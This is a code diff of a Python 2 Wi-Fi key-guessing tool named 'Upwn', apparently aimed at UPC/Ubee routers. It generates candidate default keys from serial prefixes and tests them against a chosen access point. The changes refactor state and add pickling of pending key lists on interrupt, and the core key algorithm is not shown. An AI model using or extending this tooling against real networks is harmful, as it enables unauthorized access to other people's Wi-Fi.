@@ -6,6 +6,7 @@ import os
 import sys
 import time
 import signal
+import pickle
 
 OKGREEN = '\033[92m'
 WARNING = '\033[93m'
@@ -16,11 +17,17 @@ ENDC = '\033[0m'
 class Upwn(object):
     ap_list = []
     mac_list = []
+    saap = []
+    sapp = []
+    sbap = []
+    testall = []
+    ubeekeys = []
     ghz = 24
     whatyearisit = 0
-    wifi_interface = ''
     cntaps = 0
     allkeys = 0
+    listnr = 0
+    wifi_interface = ''
 
     """
     PROGRAM LOGIC, function calls
@@ -31,14 +38,20 @@ class Upwn(object):
         Upwn.banner()
         aps, macs, ubees, ghz = Upwn.getaps()
         Upwn.getsetiface()
-        listnr = Upwn.setap(aps, macs)
-        isubee = Upwn.checkubee(ubees, listnr)
-        Upwn.setghz(ghz, listnr)
+        Upwn.listnr = Upwn.setap(aps, macs)
+        Upwn.setghz(ghz, Upwn.listnr)
+
+        isubee = Upwn.checkubee(ubees, Upwn.listnr)
+        Upwn.saap = Upwn.gen_keys(Upwn.listnr, 'SAAP')
+        Upwn.sapp = Upwn.gen_keys(Upwn.listnr, 'SAPP')
+        Upwn.sbap = Upwn.gen_keys(Upwn.listnr, 'SBAP')
+        Upwn.testall = Upwn.saap + Upwn.sapp + Upwn.sbap
+
         prefix = Upwn.serials()
-        ubeekeys = Upwn.gen_keys(listnr, 'UAAP')
-        keys = Upwn.gen_keys(listnr, prefix)
-        Upwn.cntkeys(isubee, ubeekeys, keys)
-        Upwn.pretest(listnr, keys, ubeekeys)
+        Upwn.ubeekeys = Upwn.gen_keys(Upwn.listnr, 'UAAP')
+        keys = Upwn.gen_keys(Upwn.listnr, prefix)
+        Upwn.cntkeys(isubee, Upwn.ubeekeys, keys)
+        Upwn.pretest(Upwn.listnr, keys, Upwn.ubeekeys)
         Upwn.deadend()
 
     '''
@@ -76,7 +89,7 @@ class Upwn(object):
                 print OKGREEN + '[+] ' + ENDC + item
                 Upwn.allkeys += 1
         else:
-            ubeekeys = []
+            Upwn.ubeekeys = []
 
         for item in keys:
             print OKGREEN + '[+] ' + ENDC + item
@@ -191,10 +204,10 @@ class Upwn(object):
     @staticmethod
     def serials():
         print OKGREEN + "\n\nAvailable serial prefixes:" + ENDC
-        print "[0] SAAP (default)"
-        print "[1] SAPP"
-        print "[2] SBAP"
-        print "[3] all (may take a while)"
+        print "[0] SAAP {" + str(len(Upwn.saap)) + "} (default)"
+        print "[1] SAPP {" + str(len(Upwn.sapp)) + "}"
+        print "[2] SBAP {" + str(len(Upwn.sbap)) + "}"
+        print "[3] all  {" + str(len(Upwn.testall)) + "}"
 
         prefix = ''
         while True:
@@ -297,11 +310,10 @@ class Upwn(object):
                 if response in 'Yy' or '':
                     if keys and ubeekeys:
                         keys.insert(0, ubeekeys[0])
-                        Upwn.keytest(listnr, keys, Upwn.wifi_interface)
-                        break
-                    else:
-                        Upwn.keytest(listnr, keys, Upwn.wifi_interface)
-                        break
+
+                    Upwn.keytest(listnr, keys, Upwn.wifi_interface)
+                    break
+
                 elif response in 'Nn':
                     exit(0)
             except ValueError:
@@ -384,6 +396,24 @@ class Upwn(object):
     '''
     @staticmethod
     def signal_handler(signal, frame):
+        f = open('pending.p', 'a')
+        pickle.dump(Upwn.ap_list[Upwn.listnr], f)
+        pickle.dump(Upwn.saap, f)
+        pickle.dump(Upwn.sapp, f)
+        pickle.dump(Upwn.sbap, f)
+        f.close()
+
+        p = open('pending.p', 'r')
+        ap = pickle.load(p)
+        saap = pickle.load(p)
+        sapp = pickle.load(p)
+        sbap = pickle.load(p)
+
+        print ap
+        print saap
+        print sapp
+        print sbap
+
         exit(0)
 
     '''
